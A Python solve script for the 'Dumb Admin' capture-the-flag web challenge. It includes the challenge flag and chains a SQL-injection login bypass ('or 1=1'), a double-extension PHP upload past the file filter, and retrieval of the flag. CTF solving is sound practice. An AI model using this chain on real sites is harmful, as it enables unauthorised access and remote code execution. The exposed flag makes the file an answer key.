"""
Dumb Admin - Web - Easy
FLAG: DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}
"""

import requests
from bs4 import BeautifulSoup

APP_ROOT = "https://dumbadmin.challs.dantectf.it"

session = requests.Session()


def login():
    """
    Simple SQL injection, but you need to put some arbitrary 6+ letter string in the password field to pass the validation.
    """
    url = f"{APP_ROOT}/index.php"
    creds = {"username": "' or 1=1;--", "password": "ninechars"}
    session.post(url, data=creds)


def upload_rce():
    """
    Uploads the shell.jpg.php file to the dashboard.
    This is a simple file upload filter bypass. The filter checks for the extension of the file and the file signature.
    """
    url = f"{APP_ROOT}/dashboard.php"
    with open("exploit.jpg.php", "rb") as file:
        files = {"fileUploaded": (
            "exploit.jpg.php", file, "application/octet-stream")}
        response = session.post(url, files=files, allow_redirects=True)
        return response.text


def get_flag(upload_res):
    """
    Parses the location of the flag and visits it to get the flag.
    """
    soup = BeautifulSoup(upload_res, "html.parser")
    view_url = f"{APP_ROOT}/{soup.find('a').get('href')}"
    response = session.get(view_url)
    soup = BeautifulSoup(response.text, "html.parser")
    flag_url = f"{APP_ROOT}/{soup.find('img').get('src')}"
    response = session.get(flag_url)
    flag = response.text.split("DANTE{")[1].split("}")[0]
    return flag


def main():
    """
    Exploit! :)
    """
    login()
    upload_res = upload_rce()
    print(f"Flag: DANTE{{{get_flag(upload_res)}}}")


if __name__ == "__main__":
    main()
